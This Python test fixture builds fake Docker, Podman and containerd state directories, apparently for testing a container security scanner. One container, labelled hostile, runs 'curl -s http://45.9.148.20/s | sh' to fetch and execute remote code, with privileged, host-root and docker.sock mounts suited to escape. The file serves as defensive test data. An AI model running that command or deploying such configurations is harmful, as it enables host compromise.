"""Synthetic Docker / Podman / containerd data dirs for the test-suite."""

from __future__ import annotations

import json
from pathlib import Path


def _w(p: Path, obj):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(obj))


def docker_tree(root: Path):
    base = root / "var/lib/docker/containers"
    _w(root / "var/lib/docker/image/overlay2/repositories.json",
       {"Repositories": {"nginx": {"nginx:1.25": "sha256:aaa111"},
                         "busybox": {"busybox:latest": "sha256:bbb222"}}})

    # a benign web container
    cid = "a1b2c3d4e5f6" + "0" * 52
    _w(base / cid / "config.v2.json", {
        "ID": cid, "Created": "2026-01-10T08:00:00Z", "Name": "/web",
        "Path": "/docker-entrypoint.sh", "Args": ["nginx", "-g", "daemon off;"],
        "Image": "sha256:aaa111",
        "Config": {"Image": "nginx:1.25", "Env": ["NGINX_VERSION=1.25"],
                   "Cmd": ["nginx", "-g", "daemon off;"],
                   "Entrypoint": ["/docker-entrypoint.sh"],
                   "User": "101", "Labels": {"com.example.team": "web"}},
        "State": {"Running": True, "Pid": 4321,
                  "StartedAt": "2026-01-10T08:00:01Z",
                  "FinishedAt": "0001-01-01T00:00:00Z", "ExitCode": 0},
        "MountPoints": {"/usr/share/nginx/html": {
            "Source": "/srv/www", "Destination": "/usr/share/nginx/html",
            "RW": False, "Type": "bind"}},
    })
    _w(base / cid / "hostconfig.json", {
        "Privileged": False, "NetworkMode": "bridge",
        "RestartPolicy": {"Name": "unless-stopped"},
        "PortBindings": {"80/tcp": [{"HostIp": "", "HostPort": "8080"}]},
        "Binds": ["/srv/www:/usr/share/nginx/html:ro"]})
    (base / cid / f"{cid}-json.log").write_text(
        '{"log":"start\\n","stream":"stdout","time":"2026-01-10T08:00:02Z"}\n')

    # a hostile container
    hid = "dead" + "b" * 60
    _w(base / hid / "config.v2.json", {
        "ID": hid, "Created": "2026-02-01T22:14:00Z", "Name": "/ops",
        "Path": "/bin/sh",
        "Args": ["-c", "curl -s http://45.9.148.20/s | sh"],
        "Image": "sha256:bbb222",
        "Config": {"Image": "busybox:latest",
                   "Env": ["DB_PASSWORD=hunter2", "PATH=/usr/bin"],
                   "Cmd": ["-c", "curl -s http://45.9.148.20/s | sh"],
                   "Entrypoint": ["/bin/sh"], "User": ""},
        "State": {"Running": False, "Pid": 0,
                  "StartedAt": "2026-02-01T22:14:01Z",
                  "FinishedAt": "2026-02-01T22:18:00Z", "ExitCode": 137,
                  "Error": ""},
        "MountPoints": {},
    })
    _w(base / hid / "hostconfig.json", {
        "Privileged": True,
        "CapAdd": ["SYS_ADMIN", "NET_RAW"],
        "SecurityOpt": ["apparmor:unconfined", "seccomp=unconfined"],
        "NetworkMode": "host", "PidMode": "host",
        "RestartPolicy": {"Name": "always"},
        "Binds": ["/var/run/docker.sock:/var/run/docker.sock",
                  "/:/host", "/etc:/host-etc:ro"],
        "Devices": [{"PathOnHost": "/dev/sda", "PathInContainer": "/dev/sda"}]})
    return root


def podman_tree(root: Path):
    storage = root / "var/lib/containers/storage/overlay-containers"
    _w(root / "var/lib/containers/storage/overlay-images/images.json",
       [{"id": "img777", "names": ["docker.io/library/redis:7"]}])
    cid = "podman111" + "c" * 55
    _w(storage / "containers.json", [{
        "id": cid, "names": ["cache"], "image": "img777",
        "created": "2026-01-15T10:00:00Z",
        "metadata": json.dumps({"image-name": "docker.io/library/redis:7",
                                "name": "cache"})}])
    ud = storage / cid / "userdata"
    _w(ud / "config.json", {
        "process": {"args": ["redis-server", "--appendonly", "yes"],
                    "env": ["REDIS_TOKEN=abc123"],
                    "user": {"uid": 999, "gid": 999},
                    "capabilities": {"bounding": ["CAP_NET_ADMIN",
                                                  "CAP_CHOWN"]}},
        "mounts": [{"destination": "/data", "source": "/opt/redis",
                    "type": "bind", "options": ["rw"]},
                   {"destination": "/proc", "source": "proc", "type": "proc"}],
        "linux": {"namespaces": [{"type": "pid", "path": "/proc/1/ns/pid"},
                                 {"type": "network"}, {"type": "ipc"},
                                 {"type": "uts"}, {"type": "mount"}],
                  "apparmorProfile": "unconfined"},
        "annotations": {"io.podman.annotations.privileged": "TRUE"}})
    _w(ud / "state.json", {"status": "running"})
    (ud / "ctr.log").write_text("1:M ready\n")
    return root


def containerd_tree(root: Path):
    base = (root / "var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/"
            "cid-abcdef")
    _w(base / "config.json", {
        "process": {"args": ["/pause"], "env": ["PATH=/usr/bin"],
                    "user": {"uid": 0}},
        "mounts": [{"destination": "/etc/hosts", "source": "/var/lib/kubelet",
                    "type": "bind", "options": ["rw"]}],
        "linux": {"namespaces": [{"type": "pid"}, {"type": "ipc"},
                                 {"type": "uts"}, {"type": "mount"}]},
        "annotations": {"io.kubernetes.cri.container-name": "pause",
                        "io.kubernetes.cri.image-name": "pause:3.9"}})
    (base / "log").write_text("")
    return root


def full_tree(root: Path):
    docker_tree(root)
    podman_tree(root)
    containerd_tree(root)
    return root
